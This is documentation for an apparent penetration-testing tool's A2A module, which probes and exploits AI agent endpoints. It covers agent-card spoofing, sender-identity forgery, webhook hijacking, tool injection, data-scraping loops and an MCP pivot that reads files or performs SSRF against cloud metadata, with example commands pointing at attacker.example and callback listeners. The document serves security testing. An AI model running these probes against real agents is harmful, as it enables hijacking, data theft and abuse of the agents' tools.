# A2A

Enumerate and exploit Agent-to-Agent (A2A) protocol endpoints.

## Overview

The `a2a` module probes Google's [Agent-to-Agent (A2A)](https://google.github.io/A2A/) protocol surface: it reads the public **agent card**, enumerates advertised **skills**, and drives bounded **JSON-RPC task** probes — including streaming SSE eavesdrop, push-notification webhook hijack, a cross-protocol pivot into MCP-backed tools, and five single-node structural probes (auth enforcement, message integrity, sender identity, delegation, agent-card trust).

A2A is an open agent-protocol frontier with near-zero CVEs but real structural weaknesses, so most of these verbs target **implementation gaps** (advertise-but-don't-enforce, missing integrity/identity verification, blind trust) rather than known bugs.

**Protocol/version handling.** The client speaks A2A **v1.0** first (`SendMessage`, `GetTask`, `CancelTask`, `SendStreamingMessage`) and automatically falls back to **v0.3** (`message/send`, `message/stream`, `tasks/get`) and legacy **v0.2** (`tasks/send`) when the agent rejects a version with a JSON-RPC `-32601` / `-32602` / `-32009` error. The agent card is fetched from `/.well-known/agent-card.json`, falling back to `/.well-known/agent.json` for older agents.

**Scope (single-node).** Every verb operates against exactly one `--target`. Traffic interception/rewriting, agent-mesh trust-mapping, and differential privilege-laundering proof are **out of scope** for aipostex — they belong to adjacent tooling. A2A here is strictly find-and-probe-a-node.

## Subcommands

### Read-only (no `--force-exploit` required)

| Subcommand | Description |
|---|---|
| `enum` | Fetch and parse the public A2A agent card |
| `skills` | Enumerate advertised agent skills with I/O modes |
| `task-status` | Poll A2A task state |
| `auth-probe` | Check whether advertised authentication is actually enforced |

### Gated (requires `--force-exploit`)

| Subcommand | Description |
|---|---|
| `msg-integrity` | Test whether the agent verifies message integrity |
| `sender-spoof` | Forge a self-asserted sender identity and detect if behavior depends on it |
| `delegate-probe` | Test whether the agent delegates to a caller-supplied peer (confused deputy) |
| `card-spoof` | Test whether the agent fetches/trusts a caller-supplied agent card |
| `task-send` | Submit an unauthenticated A2A message/task |
| `task-cancel` | Cancel an A2A task (DoS-style) |
| `stream-probe` | Subscribe to a streaming message/task and observe intermediate events |
| `push-hijack` | Register a canary task webhook |
| `mcp-pivot` | Cross-protocol probe: drive an A2A task into MCP-backed tools |
| `scrape-loop` | Continuous task-submission loop for data extraction |
| `tool-inject` | Inject a tool call via a task message to test blind forwarding |
| `replay` | Replay a message to test deterministic / stateless behavior |

## Flags

### Common (persistent)

| Flag | Required | Description |
|---|---|---|
| `--target`, `-t` | Yes | A2A base URL (e.g., `http://127.0.0.1:8103`) |
| `--header` | No | Additional HTTP header(s) in `Key: Value` format. Repeatable. |

### Per-subcommand

| Subcommand | Flags |
|---|---|
| `auth-probe` | `--token` (optional known-good bearer token for the auth differential) |
| `msg-integrity` | `--mode` (`unsigned` \| `bad-sig`, default `bad-sig`), `--message` |
| `sender-spoof` | `--spoof-id` (required), `--message` |
| `delegate-probe` | `--peer-url` (default a non-resolving canary), `--depth` (chained hops), `--message` |
| `card-spoof` | `--card-url` (default a non-resolving canary), `--message` |
| `task-send` | `--message` (required), `--task-id` |
| `task-status` / `task-cancel` | `--task-id` (required) |
| `stream-probe` | `--message`, `--task-id`, `--max-bytes` (default 32KB), `--continuous`, `--poll-interval` |
| `push-hijack` | `--task-id` (required), `--webhook-url` (default a non-resolving canary) |
| `mcp-pivot` | `--preset` (`tool-enum` \| `file-read` \| `ssrf`), `--path`, `--url`, `--loop`, `--max-pivots` |
| `scrape-loop` | `--prompt` (repeatable), `--delay` |
| `tool-inject` | `--tool` (required), `--args` (JSON), `--task-id` |
| `replay` | `--message` (required), `--original-task-id` |

## What each `landed` level means here

Findings carry a `landed` axis recording what actually landed on the target, and it is **honest in both directions** — a verb records an elevated `landed` value only when a weakness is genuinely present, and `reachable` when the agent behaves safely. A 4xx/5xx rejection from an agent that enforces auth is a valid "not weak" signal, not an error. A2A reaches all five levels.

| `landed` | What produces it in a2a |
|---|---|
| `reachable` | `enum`, `skills`, and the safe/rejected branch of every probe — the card and skills were read, or the agent rejected the probe. |
| `influenced` | Our input was accepted but no readback/execution is confirmed: `auth-probe` (unauthenticated read processed), `msg-integrity` (bad/absent signature accepted), `sender-spoof` (forged id changes behavior), `delegate-probe` (confused-deputy outbound attempt), `card-spoof` accept-only, `push-hijack` registration accepted, `task-send` submission accepted, `mcp-pivot --loop` step that errored. |
| `read-confirmed` | We read confirmed state back off the agent: `task-status` (task state read), `push-hijack` config readback confirming the attacker webhook persisted. |
| `execution-confirmed` | An action executed on the target: `task-send`/`task-cancel`/`stream-probe`/`tool-inject`/`replay`/`scrape-loop` on an accepted, non-OOB action; `sender-spoof` where an anonymous request is rejected but the forged-id one is accepted (privilege via spoof); `mcp-pivot --loop` step that succeeded. |
| `takeover-capable` | Full control demonstrated: `card-spoof` or `push-hijack` with `--callback-url`, where a **real inbound out-of-band callback** confirms the agent fetched the attacker card or delivered to the attacker webhook; `mcp-pivot --preset file-read`/`ssrf` where the MCP-backed tool actually reads the file / fetches the URL. |

For the verbs whose weakness is an outbound action — `card-spoof` (fetch-and-trust) and `push-hijack` (webhook delivery) — an accepted instruction alone is only `influenced`. Pass an http(s) `--callback-url`: the verb stands up an in-process out-of-band listener on that URL and registers it with the target, and only a **real inbound callback** upgrades what landed to `takeover-capable`. This is the same OOB-confirmation primitive the TorchServe SSRF check uses.

## Operator console

To drive the agent by hand, the [`shell`](../cli/shell.md) verb (`aipostex a2a … shell --force-exploit`) opens an interactive task console: each line you type is submitted to the agent as a task and the agent's response prints back, with the session mined for credentials on exit. It is an execution shell, so it requires `--force-exploit`; you drive every task, nothing chains on its own. A2A has no one-shot `request` verb — the task lifecycle is stateful, so use the shell.

## Structural probes (the five single-node verbs)

Each probe sends a benign request and classifies the response; none carry offensive payloads — they exercise the agent's **validation gaps**.

### `auth-probe` (read-only)

Reads the card's advertised `securitySchemes`, then issues an unauthenticated `tasks/get` for a nonexistent probe id (also with a bogus bearer, and an optional `--token`). If the card **advertises** a scheme but the unauthenticated read is **processed** (any status other than 401/403), authentication is optional/not enforced → **Medium**, `influenced`. If the read is rejected (401/403) or the card advertises nothing, it reports the posture as **Info**, `reachable` (`enforced` / `not-enforced`).

```bash
aipostex a2a --target http://127.0.0.1:8103 auth-probe
```

### `msg-integrity` (gated)

Submits a benign message with a **present-but-invalid** signature header (`--mode bad-sig`) or with no signature (`--mode unsigned`). If a `bad-sig` message is accepted (2xx, no JSON-RPC error), the signature-verification path is absent or decorative → **Medium**, `influenced`. `unsigned` acceptance is a **Low** structural-gap note (A2A has no mandatory signature). A rejection is **Info**, `reachable`.

```bash
aipostex a2a --target http://127.0.0.1:8103 msg-integrity --mode bad-sig --force-exploit
```

### `sender-spoof` (gated)

Submits the same message twice — once with no asserted sender, once with `--spoof-id` set in the `X-A2A-Caller-Id` / `X-Agent-Id` / `X-A2A-From` headers — and diffs the responses. A behavioral delta (status / error / task state) means the agent acts on an unverified identity → **Medium**, `influenced`. If the anonymous request is rejected but the forged-id one is accepted, that is privilege gained via spoofing → **High**, `execution-confirmed`. No delta is **Info**.

```bash
aipostex a2a --target http://127.0.0.1:8103 sender-spoof --spoof-id acme-admin --force-exploit
```

### `delegate-probe` (gated)

Instructs the agent to delegate a subtask to a **caller-supplied** peer URL (`--peer-url`, default a non-resolving canary; `--depth` for chained hops). If the agent attempts the outbound call (the response echoes the peer URL, delegation/forward language, or a connection error), it delegates to an un-allowlisted peer — a **confused-deputy** weakness → **High**, `influenced`. An accepted task with no observed outbound is **Low**; a rejection is **Info**.

```bash
aipostex a2a --target http://127.0.0.1:8103 delegate-probe --peer-url http://peer:8103/ --force-exploit
```

### `card-spoof` (gated)

Instructs the agent to fetch and trust an agent card at a **caller-supplied** URL (`--card-url`). Agent cards are unauthenticated discovery documents; an agent that ingests caller-supplied cards is hijackable. Acceptance (2xx, no JSON-RPC error) → **Medium**, `influenced`; rejection → **Info**.

**Listener-confirmed (`--callback-url`).** Pass an http(s) `--callback-url` and it is used **as** the attacker card URL while an in-process out-of-band listener runs on its port. If the agent actually dereferences the URL, the inbound hit is captured and the finding is upgraded to **High**, `takeover-capable` (`card-trust-confirmed`) — a real inbound callback confirming the agent fetched the attacker card, not just that it accepted the instruction.

```bash
# Influenced (accept signal only):
aipostex a2a --target http://127.0.0.1:8103 card-spoof --card-url http://attacker.example/.well-known/agent-card.json --force-exploit
# Listener-confirmed (exploited on a real fetch); use a host/port the agent can reach:
aipostex a2a --target http://127.0.0.1:8103 card-spoof --callback-url http://10.0.0.5:8000/card --force-exploit
```

## Task & stream verbs

- **`task-send`** — submit an unauthenticated `message/task`; reports honestly whether submission was accepted vs rejected (never claims success on a JSON-RPC error).
- **`stream-probe`** — open an SSE stream and observe intermediate reasoning / tool-call events, bounded by `--max-bytes`; `--continuous` reconnects until the task completes. Only claims an eavesdrop when events are actually observed.
- **`push-hijack`** — register an attacker-controlled task webhook (default a non-resolving canary) and query the push-notification config to confirm registration persisted. Registration accepted is `influenced`; pass an http(s) `--callback-url` to register it as the webhook and run an out-of-band listener — a real inbound delivery upgrades what landed to `takeover-capable` (`callback_confirmed`).
- **`task-status`** / **`task-cancel`** — poll or cancel a task by `--task-id`.

## Cross-protocol & extraction verbs

- **`mcp-pivot`** — drive an A2A task into the agent's MCP-backed tools. Presets: `tool-enum` (list tools), `file-read` (read `--path`, default `/etc/hostname`), `ssrf` (fetch `--url`, default the cloud metadata endpoint). `--loop` chains follow-up tasks up to `--max-pivots`.
- **`scrape-loop`** — submit a series of `--prompt` extraction requests as separate tasks to systematically pull data from an agent with sensitive tools.
- **`tool-inject`** — instruct the agent to invoke a named `--tool` with attacker-supplied `--args` to probe blind tool forwarding.
- **`replay`** — re-send a message and compare to a previous task's output to test for missing session binding / replayability.

## Follow-on guidance

Every offensive verb emits **Next Actions** — the finding's Summary shows
`N target(s) with follow-on guidance` and the block lists the concrete next command,
each chaining to the a2a verb that deepens the same weakness (and preserving any
discovered identifier such as a task id):

- `card-spoof` → `delegate-probe`, `mcp-pivot`, `tool-inject` (exercise the skills/tools the agent now trusts).
- `push-hijack` → `task-status --task-id <id>`, `task-send` (confirm delivery, then route results to the hijacked webhook).
- `msg-integrity` / `replay` / `sender-spoof` → escalate to one another (tampering ↔ identity abuse ↔ replay).
- `delegate-probe` → `mcp-pivot`, `card-spoof`; `auth-probe` → `skills`, `task-send`, `card-spoof`.

Gated follow-ons (anything needing `--force-exploit`) are marked as such and ordered after read-only steps.

## Examples

```bash
# Enumerate the agent and its skills
aipostex a2a --target http://127.0.0.1:8103 enum
aipostex a2a --target http://127.0.0.1:8103 skills

# Structural posture (auth is read-only; the rest are gated)
aipostex a2a --target http://127.0.0.1:8103 auth-probe
aipostex a2a --target http://127.0.0.1:8103 msg-integrity --mode bad-sig --force-exploit
aipostex a2a --target http://127.0.0.1:8103 sender-spoof --spoof-id acme-admin --force-exploit
aipostex a2a --target http://127.0.0.1:8103 delegate-probe --peer-url http://peer:8103/ --force-exploit
aipostex a2a --target http://127.0.0.1:8103 card-spoof --card-url http://attacker.example/.well-known/agent-card.json --force-exploit

# Cross-protocol pivot into MCP-backed tools
aipostex a2a --target http://127.0.0.1:8103 mcp-pivot --preset file-read --force-exploit
```
